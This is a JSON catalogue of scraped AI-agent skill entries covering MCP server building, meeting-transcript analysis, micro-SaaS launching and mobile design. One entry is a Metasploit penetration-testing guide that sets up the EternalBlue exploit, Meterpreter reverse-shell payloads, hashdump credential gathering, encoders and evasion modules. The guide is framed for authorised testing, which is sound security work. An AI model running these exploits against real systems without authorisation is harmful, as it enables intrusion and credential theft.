      "id": "awesome-llm-mcp-builder",
      "name": "mcp-builder",
      "slug": "awesome-llm-mcp-builder",
      "description": "Guide for creating high-quality MCP (Model Context Protocol) servers that enable LLMs to interact with external services through well-designed tools. Use when building MCP servers to integrate external APIs or services, whether in Python (FastMCP) or Node/TypeScript (MCP SDK).",
      "category": "Development & Code Tools",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/mcp-builder",
      "content": "\n# MCP Server Development Guide\n\n## Overview\n\nTo create high-quality MCP (Model Context Protocol) servers that enable LLMs to effectively interact with external services, use this skill. An MCP server provides tools that allow LLMs to access external services and APIs. The quality of an MCP server is measured by how well it enables LLMs to accomplish real-world tasks using the tools provided.\n\n---\n\n# Process\n\n## 🚀 High-Level Workflow\n\nCreating a high-quality MCP server involves four main phases:\n\n### Phase 1: Deep Research and Planning\n\n#### 1.1 Understand Agent-Centric Design Principles\n\nBefore diving into implementation, understand how to design tools for AI agents by reviewing these principles:\n\n**Build for Workflows, Not Just API Endpoints:**\n- Don't simply wrap existing API endpoints - build thoughtful, high-impact workflow tools\n- Consolidate related operations (e.g., `schedule_event` that both checks availability and creates event)\n- Focus on tools that enable complete tasks, not just individual API calls\n- Consider what workflows agents actually need to accomplish\n\n**Optimize for Limited Context:**\n- Agents have constrained context windows - make every token count\n- Return high-signal information, not exhaustive data dumps\n- Provide \"concise\" vs \"detailed\" response format options\n- Default to human-readable identifiers over technical codes (names over IDs)\n- Consider the agent's context budget as a scarce resource\n\n**Design Actionable Error Messages:**\n- Error messages should guide agents toward correct usage patterns\n- Suggest specific next steps: \"Try using filter='active_only' to reduce results\"\n- Make errors educational, not just diagnostic\n- Help agents learn proper tool usage through clear feedback\n\n**Follow Natural Task Subdivisions:**\n- Tool names should reflect how humans think about tasks\n- Group related tools with consistent prefixes for discoverability\n- Design tools around natural workflows, not just API structure\n\n**Use Evaluation-Driven Development:**\n- Create realistic evaluation scenarios early\n- Let agent feedback drive tool improvements\n- Prototype quickly and iterate based on actual agent performance\n\n#### 1.3 Study MCP Protocol Documentation\n\n**Fetch the latest MCP protocol documentation:**\n\nUse WebFetch to load: `https://modelcontextprotocol.io/llms-full.txt`\n\nThis comprehensive document contains the complete MCP specification and guidelines.\n\n#### 1.4 Study Framework Documentation\n\n**Load and read the following reference files:**\n\n- **MCP Best Practices**: [📋 View Best Practices](./reference/mcp_best_practices.md) - Core guidelines for all MCP servers\n\n**For Python implementations, also load:**\n- **Python SDK Documentation**: Use WebFetch to load `https://raw.githubusercontent.com/modelcontextprotocol/python-sdk/main/README.md`\n- [🐍 Python Implementation Guide](./reference/python_mcp_server.md) - Python-specific best practices and examples\n\n**For Node/TypeScript implementations, also load:**\n- **TypeScript SDK Documentation**: Use WebFetch to load `https://raw.githubusercontent.com/modelcontextprotocol/typescript-sdk/main/README.md`\n- [⚡ TypeScript Implementation Guide](./reference/node_mcp_server.md) - Node/TypeScript-specific best practices and examples\n\n#### 1.5 Exhaustively Study API Documentation\n\nTo integrate a service, read through **ALL** available API documentation:\n- Official API reference documentation\n- Authentication and authorization requirements\n- Rate limiting and pagination patterns\n- Error responses and status codes\n- Available endpoints and their parameters\n- Data models and schemas\n\n**To gather comprehensive information, use web search and the WebFetch tool as needed.**\n\n#### 1.6 Create a Comprehensive Implementation Plan\n\nBased on your research, create a detailed plan that includes:\n\n**Tool Selection:**\n- List the most valuable endpoints/operations to implement\n- Prioritize tools that enable the most common and important use cases\n- Consider which tools work together to enable complex workflows\n\n**Shared Utilities and Helpers:**\n- Identify common API request patterns\n- Plan pagination helpers\n- Design filtering and formatting utilities\n- Plan error handling strategies\n\n**Input/Output Design:**\n- Define input validation models (Pydantic for Python, Zod for TypeScript)\n- Design consistent response formats (e.g., JSON or Markdown), and configurable levels of detail (e.g., Detailed or Concise)\n- Plan for large-scale usage (thousands of users/resources)\n- Implement character limits and truncation strategies (e.g., 25,000 tokens)\n\n**Error Handling Strategy:**\n- Plan graceful failure modes\n- Design clear, actionable, LLM-friendly, natural language error messages which prompt further action\n- Consider rate limiting and timeout scenarios\n- Handle authentication and authorization errors\n\n---\n\n### Phase 2: Implementation\n\nNow that you have a comprehensive plan, begin implementation following language-specific best practices.\n\n#### 2.1 Set Up Project Structure\n\n**F",
      "tags": [
        "python",
        "typescript",
        "node",
        "markdown",
        "api",
        "mcp",
        "ai",
        "agent",
        "llm",
        "workflow"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:54.095Z"
    },
    {
      "id": "composio-meeting-insights-analyzer",
      "name": "meeting-insights-analyzer",
      "slug": "meeting-insights-analyzer",
      "description": "Analyzes meeting transcripts and recordings to uncover behavioral patterns, communication insights, and actionable feedback. Identifies when you avoid conflict, use filler words, dominate conversations, or miss opportunities to listen. Perfect for professionals seeking to improve their communication and leadership skills.",
      "category": "Communication & Writing",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/meeting-insights-analyzer",
      "content": "\n# Meeting Insights Analyzer\n\nThis skill transforms your meeting transcripts into actionable insights about your communication patterns, helping you become a more effective communicator and leader.\n\n## When to Use This Skill\n\n- Analyzing your communication patterns across multiple meetings\n- Getting feedback on your leadership and facilitation style\n- Identifying when you avoid difficult conversations\n- Understanding your speaking habits and filler words\n- Tracking improvement in communication skills over time\n- Preparing for performance reviews with concrete examples\n- Coaching team members on their communication style\n\n## What This Skill Does\n\n1. **Pattern Recognition**: Identifies recurring behaviors across meetings like:\n   - Conflict avoidance or indirect communication\n   - Speaking ratios and turn-taking\n   - Question-asking vs. statement-making patterns\n   - Active listening indicators\n   - Decision-making approaches\n\n2. **Communication Analysis**: Evaluates communication effectiveness:\n   - Clarity and directness\n   - Use of filler words and hedging language\n   - Tone and sentiment patterns\n   - Meeting control and facilitation\n\n3. **Actionable Feedback**: Provides specific, timestamped examples with:\n   - What happened\n   - Why it matters\n   - How to improve\n\n4. **Trend Tracking**: Compares patterns over time when analyzing multiple meetings\n\n## How to Use\n\n### Basic Setup\n\n1. Download your meeting transcripts to a folder (e.g., `~/meetings/`)\n2. Navigate to that folder in Claude Code\n3. Ask for the analysis you want\n\n### Quick Start Examples\n\n```\nAnalyze all meetings in this folder and tell me when I avoided conflict.\n```\n\n```\nLook at my meetings from the past month and identify my communication patterns.\n```\n\n```\nCompare my facilitation style between these two meeting folders.\n```\n\n### Advanced Analysis\n\n```\nAnalyze all transcripts in this folder and:\n1. Identify when I interrupted others\n2. Calculate my speaking ratio\n3. Find moments I avoided giving direct feedback\n4. Track my use of filler words\n5. Show examples of good active listening\n```\n\n## Instructions\n\nWhen a user requests meeting analysis:\n\n1. **Discover Available Data**\n   - Scan the folder for transcript files (.txt, .md, .vtt, .srt, .docx)\n   - Check if files contain speaker labels and timestamps\n   - Confirm the date range of meetings\n   - Identify the user's name/identifier in transcripts\n\n2. **Clarify Analysis Goals**\n   \n   If not specified, ask what they want to learn:\n   - Specific behaviors (conflict avoidance, interruptions, filler words)\n   - Communication effectiveness (clarity, directness, listening)\n   - Meeting facilitation skills\n   - Speaking patterns and ratios\n   - Growth areas for improvement\n   \n3. **Analyze Patterns**\n\n   For each requested insight:\n   \n   **Conflict Avoidance**:\n   - Look for hedging language (\"maybe\", \"kind of\", \"I think\")\n   - Indirect phrasing instead of direct requests\n   - Changing subject when tension arises\n   - Agreeing without commitment (\"yeah, but...\")\n   - Not addressing obvious problems\n   \n   **Speaking Ratios**:\n   - Calculate percentage of meeting spent speaking\n   - Count interruptions (by and of the user)\n   - Measure average speaking turn length\n   - Track question vs. statement ratios\n   \n   **Filler Words**:\n   - Count \"um\", \"uh\", \"like\", \"you know\", \"actually\", etc.\n   - Note frequency per minute or per speaking turn\n   - Identify situations where they increase (nervous, uncertain)\n   \n   **Active Listening**:\n   - Questions that reference others' previous points\n   - Paraphrasing or summarizing others' ideas\n   - Building on others' contributions\n   - Asking clarifying questions\n   \n   **Leadership & Facilitation**:\n   - Decision-making approach (directive vs. collaborative)\n   - How disagreements are handled\n   - Inclusion of quieter participants\n   - Time management and agenda control\n   - Follow-up and action item clarity\n\n4. **Provide Specific Examples**\n\n   For each pattern found, include:\n   \n   ```markdown\n   ### [Pattern Name]\n   \n   **Finding**: [One-sentence summary of the pattern]\n   \n   **Frequency**: [X times across Y meetings]\n   \n   **Examples**:\n   \n   1. **[Meeting Name/Date]** - [Timestamp]\n      \n      **What Happened**:\n      > [Actual quote from transcript]\n      \n      **Why This Matters**:\n      [Explanation of the impact or missed opportunity]\n      \n      **Better Approach**:\n      [Specific alternative phrasing or behavior]\n   \n   [Repeat for 2-3 strongest examples]\n   ```\n\n5. **Synthesize Insights**\n\n   After analyzing all patterns, provide:\n   \n   ```markdown\n   # Meeting Insights Summary\n   \n   **Analysis Period**: [Date range]\n   **Meetings Analyzed**: [X meetings]\n   **Total Duration**: [X hours]\n   \n   ## Key Patterns Identified\n   \n   ### 1. [Primary Pattern]\n   - **Observed**: [What you saw]\n   - **Impact**: [Why it matters]\n   - **Recommendation**: [How to improve]\n   \n   ### 2. [Second Pattern]\n   [Same structure]\n   \n   ## Communication ",
      "tags": [
        "docx",
        "markdown",
        "ai",
        "claude"
      ],
      "useCases": [
        "Analyzing your communication patterns across multiple meetings",
        "Getting feedback on your leadership and facilitation style",
        "Identifying when you avoid difficult conversations",
        "Understanding your speaking habits and filler words",
        "Tracking improvement in communication skills over time"
      ],
      "instructions": "When a user requests meeting analysis:\n\n1. **Discover Available Data**\n   - Scan the folder for transcript files (.txt, .md, .vtt, .srt, .docx)\n   - Check if files contain speaker labels and timestamps\n   - Confirm the date range of meetings\n   - Identify the user's name/identifier in transcripts\n\n2. **Clarify Analysis Goals**\n   \n   If not specified, ask what they want to learn:\n   - Specific behaviors (conflict avoidance, interruptions, filler words)\n   - Communication effectiveness (clarity, directness, listening)\n   - Meeting facilitation skills\n   - Speaking patterns and ratios\n   - Growth areas for improvement\n   \n3. **Analyze Patterns**\n\n   For each requested insight:\n   \n   **Conflict Avoidance**:\n   - Look for hedging language (\"maybe\", \"kind of\", \"I think\")\n   - Indirect phrasing instead of direct requests\n   - Changing subject when tension arises\n   - Agreeing without commitment (\"yeah, but...\")\n   - Not addressing obvious problems\n   \n   **Speaking Ratios**:\n   - Calculate percentage of meeting spent speaking\n   - Count interruptions (by and of the user)\n   - Measure average speaking turn length\n   - Track question vs. statement ratios\n   \n   **Filler Words**:\n   - Count \"um\", \"uh\", \"like\", \"you know\", \"actually\", etc.\n   - Note frequency per minute or per speaking turn\n   - Identify situations where they increase (nervous, uncertain)\n   \n   **Active Listening**:\n   - Questions that reference others' previous points\n   - Paraphrasing or summarizing others' ideas\n   - Building on others' contributions\n   - Asking clarifying questions\n   \n   **Leadership & Facilitation**:\n   - Decision-making approach (directive vs. collaborative)\n   - How disagreements are handled\n   - Inclusion of quieter participants\n   - Time management and agenda control\n   - Follow-up and action item clarity\n\n4. **Provide Specific Examples**\n\n   For each pattern found, include:\n   \n   ```markdown\n   ### [Pattern Name]\n   \n   **Finding**: [One-sentence summary of the pattern]\n   \n   *",
      "scrapedAt": "2026-01-26T13:15:13.888Z"
    },
    {
      "id": "awesome-llm-meeting-insights-analyzer",
      "name": "meeting-insights-analyzer",
      "slug": "awesome-llm-meeting-insights-analyzer",
      "description": "Analyzes meeting transcripts and recordings to uncover behavioral patterns, communication insights, and actionable feedback. Identifies when you avoid conflict, use filler words, dominate conversations, or miss opportunities to listen. Perfect for professionals seeking to improve their communication",
      "category": "Communication & Writing",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/meeting-insights-analyzer",
      "content": "\n# Meeting Insights Analyzer\n\nThis skill transforms your meeting transcripts into actionable insights about your communication patterns, helping you become a more effective communicator and leader.\n\n## When to Use This Skill\n\n- Analyzing your communication patterns across multiple meetings\n- Getting feedback on your leadership and facilitation style\n- Identifying when you avoid difficult conversations\n- Understanding your speaking habits and filler words\n- Tracking improvement in communication skills over time\n- Preparing for performance reviews with concrete examples\n- Coaching team members on their communication style\n\n## What This Skill Does\n\n1. **Pattern Recognition**: Identifies recurring behaviors across meetings like:\n   - Conflict avoidance or indirect communication\n   - Speaking ratios and turn-taking\n   - Question-asking vs. statement-making patterns\n   - Active listening indicators\n   - Decision-making approaches\n\n2. **Communication Analysis**: Evaluates communication effectiveness:\n   - Clarity and directness\n   - Use of filler words and hedging language\n   - Tone and sentiment patterns\n   - Meeting control and facilitation\n\n3. **Actionable Feedback**: Provides specific, timestamped examples with:\n   - What happened\n   - Why it matters\n   - How to improve\n\n4. **Trend Tracking**: Compares patterns over time when analyzing multiple meetings\n\n## How to Use\n\n### Basic Setup\n\n1. Download your meeting transcripts to a folder (e.g., `~/meetings/`)\n2. Navigate to that folder in Claude Code\n3. Ask for the analysis you want\n\n### Quick Start Examples\n\n```\nAnalyze all meetings in this folder and tell me when I avoided conflict.\n```\n\n```\nLook at my meetings from the past month and identify my communication patterns.\n```\n\n```\nCompare my facilitation style between these two meeting folders.\n```\n\n### Advanced Analysis\n\n```\nAnalyze all transcripts in this folder and:\n1. Identify when I interrupted others\n2. Calculate my speaking ratio\n3. Find moments I avoided giving direct feedback\n4. Track my use of filler words\n5. Show examples of good active listening\n```\n\n## Instructions\n\nWhen a user requests meeting analysis:\n\n1. **Discover Available Data**\n   - Scan the folder for transcript files (.txt, .md, .vtt, .srt, .docx)\n   - Check if files contain speaker labels and timestamps\n   - Confirm the date range of meetings\n   - Identify the user's name/identifier in transcripts\n\n2. **Clarify Analysis Goals**\n   \n   If not specified, ask what they want to learn:\n   - Specific behaviors (conflict avoidance, interruptions, filler words)\n   - Communication effectiveness (clarity, directness, listening)\n   - Meeting facilitation skills\n   - Speaking patterns and ratios\n   - Growth areas for improvement\n   \n3. **Analyze Patterns**\n\n   For each requested insight:\n   \n   **Conflict Avoidance**:\n   - Look for hedging language (\"maybe\", \"kind of\", \"I think\")\n   - Indirect phrasing instead of direct requests\n   - Changing subject when tension arises\n   - Agreeing without commitment (\"yeah, but...\")\n   - Not addressing obvious problems\n   \n   **Speaking Ratios**:\n   - Calculate percentage of meeting spent speaking\n   - Count interruptions (by and of the user)\n   - Measure average speaking turn length\n   - Track question vs. statement ratios\n   \n   **Filler Words**:\n   - Count \"um\", \"uh\", \"like\", \"you know\", \"actually\", etc.\n   - Note frequency per minute or per speaking turn\n   - Identify situations where they increase (nervous, uncertain)\n   \n   **Active Listening**:\n   - Questions that reference others' previous points\n   - Paraphrasing or summarizing others' ideas\n   - Building on others' contributions\n   - Asking clarifying questions\n   \n   **Leadership & Facilitation**:\n   - Decision-making approach (directive vs. collaborative)\n   - How disagreements are handled\n   - Inclusion of quieter participants\n   - Time management and agenda control\n   - Follow-up and action item clarity\n\n4. **Provide Specific Examples**\n\n   For each pattern found, include:\n   \n   ```markdown\n   ### [Pattern Name]\n   \n   **Finding**: [One-sentence summary of the pattern]\n   \n   **Frequency**: [X times across Y meetings]\n   \n   **Examples**:\n   \n   1. **[Meeting Name/Date]** - [Timestamp]\n      \n      **What Happened**:\n      > [Actual quote from transcript]\n      \n      **Why This Matters**:\n      [Explanation of the impact or missed opportunity]\n      \n      **Better Approach**:\n      [Specific alternative phrasing or behavior]\n   \n   [Repeat for 2-3 strongest examples]\n   ```\n\n5. **Synthesize Insights**\n\n   After analyzing all patterns, provide:\n   \n   ```markdown\n   # Meeting Insights Summary\n   \n   **Analysis Period**: [Date range]\n   **Meetings Analyzed**: [X meetings]\n   **Total Duration**: [X hours]\n   \n   ## Key Patterns Identified\n   \n   ### 1. [Primary Pattern]\n   - **Observed**: [What you saw]\n   - **Impact**: [Why it matters]\n   - **Recommendation**: [How to improve]\n   \n   ### 2. [Second Pattern]\n   [Same structure]\n   \n   ## Communication ",
      "tags": [
        "docx",
        "markdown",
        "claude",
        "ai",
        "meeting",
        "insights",
        "analyzer"
      ],
      "useCases": [
        "Analyzing your communication patterns across multiple meetings",
        "Getting feedback on your leadership and facilitation style",
        "Identifying when you avoid difficult conversations",
        "Understanding your speaking habits and filler words",
        "Tracking improvement in communication skills over time"
      ],
      "scrapedAt": "2026-01-26T13:15:55.401Z"
    },
    {
      "id": "antigravity-metasploit-framework",
      "name": "Metasploit Framework",
      "slug": "metasploit-framework",
      "description": "This skill should be used when the user asks to \"use Metasploit for penetration testing\", \"exploit vulnerabilities with msfconsole\", \"create payloads with msfvenom\", \"perform post-exploitation\", \"use auxiliary modules for scanning\", or \"develop custom exploits\". It provides comprehensive guidance fo",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/metasploit-framework",
      "content": "\n# Metasploit Framework\n\n## Purpose\n\nLeverage the Metasploit Framework for comprehensive penetration testing, from initial exploitation through post-exploitation activities. Metasploit provides a unified platform for vulnerability exploitation, payload generation, auxiliary scanning, and maintaining access to compromised systems during authorized security assessments.\n\n## Prerequisites\n\n### Required Tools\n```bash\n# Metasploit comes pre-installed on Kali Linux\n# For other systems:\ncurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall\nchmod 755 msfinstall\n./msfinstall\n\n# Start PostgreSQL for database support\nsudo systemctl start postgresql\nsudo msfdb init\n```\n\n### Required Knowledge\n- Network and system fundamentals\n- Understanding of vulnerabilities and exploits\n- Basic programming concepts\n- Target enumeration techniques\n\n### Required Access\n- Written authorization for testing\n- Network access to target systems\n- Understanding of scope and rules of engagement\n\n## Outputs and Deliverables\n\n1. **Exploitation Evidence** - Screenshots and logs of successful compromises\n2. **Session Logs** - Command history and extracted data\n3. **Vulnerability Mapping** - Exploited vulnerabilities with CVE references\n4. **Post-Exploitation Artifacts** - Credentials, files, and system information\n\n## Core Workflow\n\n### Phase 1: MSFConsole Basics\n\nLaunch and navigate the Metasploit console:\n\n```bash\n# Start msfconsole\nmsfconsole\n\n# Quiet mode (skip banner)\nmsfconsole -q\n\n# Basic navigation commands\nmsf6 > help                    # Show all commands\nmsf6 > search [term]           # Search modules\nmsf6 > use [module]            # Select module\nmsf6 > info                    # Show module details\nmsf6 > show options            # Display required options\nmsf6 > set [OPTION] [value]    # Configure option\nmsf6 > run / exploit           # Execute module\nmsf6 > back                    # Return to main console\nmsf6 > exit                    # Exit msfconsole\n```\n\n### Phase 2: Module Types\n\nUnderstand the different module categories:\n\n```bash\n# 1. Exploit Modules - Target specific vulnerabilities\nmsf6 > show exploits\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\n\n# 2. Payload Modules - Code executed after exploitation\nmsf6 > show payloads\nmsf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp\n\n# 3. Auxiliary Modules - Scanning, fuzzing, enumeration\nmsf6 > show auxiliary\nmsf6 > use auxiliary/scanner/smb/smb_version\n\n# 4. Post-Exploitation Modules - Actions after compromise\nmsf6 > show post\nmsf6 > use post/windows/gather/hashdump\n\n# 5. Encoders - Obfuscate payloads\nmsf6 > show encoders\nmsf6 > set ENCODER x86/shikata_ga_nai\n\n# 6. Nops - No-operation padding for buffer overflows\nmsf6 > show nops\n\n# 7. Evasion - Bypass security controls\nmsf6 > show evasion\n```\n\n### Phase 3: Searching for Modules\n\nFind appropriate modules for targets:\n\n```bash\n# Search by name\nmsf6 > search eternalblue\n\n# Search by CVE\nmsf6 > search cve:2017-0144\n\n# Search by platform\nmsf6 > search platform:windows type:exploit\n\n# Search by type and keyword\nmsf6 > search type:auxiliary smb\n\n# Filter by rank (excellent, great, good, normal, average, low, manual)\nmsf6 > search rank:excellent\n\n# Combined search\nmsf6 > search type:exploit platform:linux apache\n\n# View search results columns:\n# Name, Disclosure Date, Rank, Check (if it can verify vulnerability), Description\n```\n\n### Phase 4: Configuring Exploits\n\nSet up an exploit for execution:\n\n```bash\n# Select exploit module\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\n\n# View required options\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > show options\n\n# Set target host\nmsf6 exploit(...) > set RHOSTS 192.168.1.100\n\n# Set target port (if different from default)\nmsf6 exploit(...) > set RPORT 445\n\n# View compatible payloads\nmsf6 exploit(...) > show payloads\n\n# Set payload\nmsf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp\n\n# Set local host for reverse connection\nmsf6 exploit(...) > set LHOST 192.168.1.50\nmsf6 exploit(...) > set LPORT 4444\n\n# View all options again to verify\nmsf6 exploit(...) > show options\n\n# Check if target is vulnerable (if supported)\nmsf6 exploit(...) > check\n\n# Execute exploit\nmsf6 exploit(...) > exploit\n# or\nmsf6 exploit(...) > run\n```\n\n### Phase 5: Payload Types\n\nSelect appropriate payload for the situation:\n\n```bash\n# Singles - Self-contained, no staging\nwindows/shell_reverse_tcp\nlinux/x86/shell_bind_tcp\n\n# Stagers - Small payload that downloads larger stage\nwindows/meterpreter/reverse_tcp\nlinux/x86/meterpreter/bind_tcp\n\n# Stages - Downloaded by stager, provides full functionality\n# Meterpreter, VNC, shell\n\n# Payload naming convention:\n# [platform]/[architecture]/[payload_type]/[connection_type]\n# Examples:\nwindows/x64/meterpreter/reverse_tcp\nlinux/x86/shell/bind_tcp\nphp/meterpreter/reverse_tcp\njava/meterpreter/reverse_https\nandroid/meterpreter/reverse_tcp\n```\n\n### Phase 6: Meterpreter S",
      "tags": [
        "python",
        "api",
        "ai",
        "workflow",
        "template",
        "document",
        "security",
        "vulnerability",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:37.601Z"
    },
    {
      "id": "antigravity-micro-saas-launcher",
      "name": "micro-saas-launcher",
      "slug": "micro-saas-launcher",
      "description": "Expert in launching small, focused SaaS products fast - the indie hacker approach to building profitable software. Covers idea validation, MVP development, pricing, launch strategies, and growing to sustainable revenue. Ship in weeks, not months. Use when: micro saas, indie hacker, small saas, side ",
      "category": "Business & Marketing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/micro-saas-launcher",
      "content": "\n# Micro-SaaS Launcher\n\n**Role**: Micro-SaaS Launch Architect\n\nYou ship fast and iterate. You know the difference between a side project\nand a business. You've seen what works in the indie hacker community. You\nhelp people go from idea to paying customers in weeks, not years. You\nfocus on sustainable, profitable businesses - not unicorn hunting.\n\n## Capabilities\n\n- Micro-SaaS strategy\n- MVP scoping\n- Pricing strategies\n- Launch playbooks\n- Indie hacker patterns\n- Solo founder tech stack\n- Early traction\n- SaaS metrics\n\n## Patterns\n\n### Idea Validation\n\nValidating before building\n\n**When to use**: When starting a micro-SaaS\n\n```javascript\n## Idea Validation\n\n### The Validation Framework\n| Question | How to Answer |\n|----------|---------------|\n| Problem exists? | Talk to 5+ potential users |\n| People pay? | Pre-sell or find competitors |\n| You can build? | Can MVP ship in 2 weeks? |\n| You can reach them? | Distribution channel exists? |\n\n### Quick Validation Methods\n1. **Landing page test**\n   - Build landing page\n   - Drive traffic (ads, community)\n   - Measure signups/interest\n\n2. **Pre-sale**\n   - Sell before building\n   - \"Join waitlist for 50% off\"\n   - If no sales, pivot\n\n3. **Competitor check**\n   - Competitors = validation\n   - No competitors = maybe no market\n   - Find gap you can fill\n\n### Red Flags\n- \"Everyone needs this\" (too broad)\n- No clear buyer (who pays?)\n- Requires marketplace dynamics\n- Needs massive scale to work\n\n### Green Flags\n- Clear, specific pain point\n- People already paying for alternatives\n- You have domain expertise\n- Distribution channel access\n```\n\n### MVP Speed Run\n\nShip MVP in 2 weeks\n\n**When to use**: When building first version\n\n```javascript\n## MVP Speed Run\n\n### The Stack (Solo-Founder Optimized)\n| Component | Choice | Why |\n|-----------|--------|-----|\n| Frontend | Next.js | Full-stack, Vercel deploy |\n| Backend | Next.js API / Supabase | Fast, scalable |\n| Database | Supabase Postgres | Free tier, auth included |\n| Auth | Supabase / Clerk | Don't build auth |\n| Payments | Stripe | Industry standard |\n| Email | Resend / Loops | Transactional + marketing |\n| Hosting | Vercel | Free tier generous |\n\n### Week 1: Core\n```\nDay 1-2: Auth + basic UI\nDay 3-4: Core feature (one thing)\nDay 5-6: Stripe integration\nDay 7: Polish and bug fixes\n```\n\n### Week 2: Launch Ready\n```\nDay 1-2: Landing page\nDay 3: Email flows (welcome, etc.)\nDay 4: Legal (privacy, terms)\nDay 5: Final testing\nDay 6-7: Soft launch\n```\n\n### What to Skip in MVP\n- Perfect design (good enough is fine)\n- All features (one core feature only)\n- Scale optimization (worry later)\n- Custom auth (use a service)\n- Multiple pricing tiers (start simple)\n```\n\n### Pricing Strategy\n\nPricing your micro-SaaS\n\n**When to use**: When setting prices\n\n```javascript\n## Pricing Strategy\n\n### Pricing Tiers for Micro-SaaS\n| Strategy | Best For |\n|----------|----------|\n| Single price | Simple tools, clear value |\n| Two tiers | Free/paid or Basic/Pro |\n| Three tiers | Most SaaS (Good/Better/Best) |\n| Usage-based | API products, variable use |\n\n### Starting Price Framework\n```\nWhat's the alternative cost? (Competitor or manual work)\nYour price = 20-50% of alternative cost\n\nExample:\n- Manual work takes 10 hours/month\n- 10 hours × $50/hour = $500 value\n- Price: $49-99/month\n```\n\n### Common Micro-SaaS Prices\n| Type | Price Range |\n|------|-------------|\n| Simple tool | $9-29/month |\n| Pro tool | $29-99/month |\n| B2B tool | $49-299/month |\n| Lifetime deal | 3-5x monthly |\n\n### Pricing Mistakes\n- Too cheap (undervalues, attracts bad customers)\n- Too complex (confuses buyers)\n- No free tier AND no trial (no way to try)\n- Charging too late (validate with money early)\n```\n\n## Anti-Patterns\n\n### ❌ Building in Secret\n\n**Why bad**: No feedback loop.\nBuilding wrong thing.\nWasted time.\nFear of shipping.\n\n**Instead**: Launch ugly MVP.\nGet feedback early.\nBuild in public.\nIterate based on users.\n\n### ❌ Feature Creep\n\n**Why bad**: Never ships.\nDilutes focus.\nConfuses users.\nDelays revenue.\n\n**Instead**: One core feature first.\nShip, then iterate.\nLet users tell you what's missing.\nSay no to most requests.\n\n### ❌ Pricing Too Low\n\n**Why bad**: Undervalues your work.\nAttracts price-sensitive customers.\nHard to run a business.\nCan't afford growth.\n\n**Instead**: Price for value, not time.\nStart higher, discount if needed.\nB2B can pay more.\nYour time has value.\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Great product, no way to reach customers | high | ## Distribution First |\n| Building for market that can't/won't pay | high | ## Market Selection |\n| New signups leaving as fast as they come | high | ## Fixing Churn |\n| Pricing page confuses potential customers | medium | ## Simple Pricing |\n\n## Related Skills\n\nWorks well with: `landing-page-design`, `backend`, `stripe`, `seo`\n",
      "tags": [
        "javascript",
        "api",
        "ai",
        "design",
        "supabase",
        "stripe",
        "seo",
        "cro",
        "marketing"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:39.177Z"
    },
    {
      "id": "antigravity-mobile-design",
      "name": "mobile-design",
      "slug": "mobile-design",
      "description": "Mobile-first design and engineering doctrine for iOS and Android apps. Covers touch interaction, performance, platform conventions, offline behavior, and mobile-specific decision-making. Teaches principles and constraints, not fixed layouts. Use for React Native, Flutter, or native mobile apps.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/mobile-design",
      "content": "# Mobile Design System\n\n**(Mobile-First · Touch-First · Platform-Respectful)**\n\n> **Philosophy:** Touch-first. Battery-conscious. Platform-respectful. Offline-capable.\n> **Core Law:** Mobile is NOT a small desktop.\n> **Operating Rule:** Think constraints first, aesthetics second.\n\nThis skill exists to **prevent desktop-thinking, AI-defaults, and unsafe assumptions** when designing or building mobile applications.\n\n---\n\n## 1. Mobile Feasibility & Risk Index (MFRI)\n\nBefore designing or implementing **any mobile feature or screen**, assess feasibility.\n\n### MFRI Dimensions (1–5)\n\n| Dimension                  | Question                                                          |\n| -------------------------- | ----------------------------------------------------------------- |\n| **Platform Clarity**       | Is the target platform (iOS / Android / both) explicitly defined? |\n| **Interaction Complexity** | How complex are gestures, flows, or navigation?                   |\n| **Performance Risk**       | Does this involve lists, animations, heavy state, or media?       |\n| **Offline Dependence**     | Does the feature break or degrade without network?                |\n| **Accessibility Risk**     | Does this impact motor, visual, or cognitive accessibility?       |\n\n### Score Formula\n\n```\nMFRI = (Platform Clarity + Accessibility Readiness)\n       − (Interaction Complexity + Performance Risk + Offline Dependence)\n```\n\n**Range:** `-10 → +10`\n\n### Interpretation\n\n| MFRI     | Meaning   | Required Action                       |\n| -------- | --------- | ------------------------------------- |\n| **6–10** | Safe      | Proceed normally                      |\n| **3–5**  | Moderate  | Add performance + UX validation       |\n| **0–2**  | Risky     | Simplify interactions or architecture |\n| **< 0**  | Dangerous | Redesign before implementation        |\n\n---\n\n## 2. Mandatory Thinking Before Any Work\n\n### ⛔ STOP: Ask Before Assuming (Required)\n\nIf **any of the following are not explicitly stated**, you MUST ask before proceeding:\n\n| Aspect     | Question                                   | Why                                      |\n| ---------- | ------------------------------------------ | ---------------------------------------- |\n| Platform   | iOS, Android, or both?                     | Affects navigation, gestures, typography |\n| Framework  | React Native, Flutter, or native?          | Determines performance and patterns      |\n| Navigation | Tabs, stack, drawer?                       | Core UX architecture                     |\n| Offline    | Must it work offline?                      | Data & sync strategy                     |\n| Devices    | Phone only or tablet too?                  | Layout & density rules                   |\n| Audience   | Consumer, enterprise, accessibility needs? | 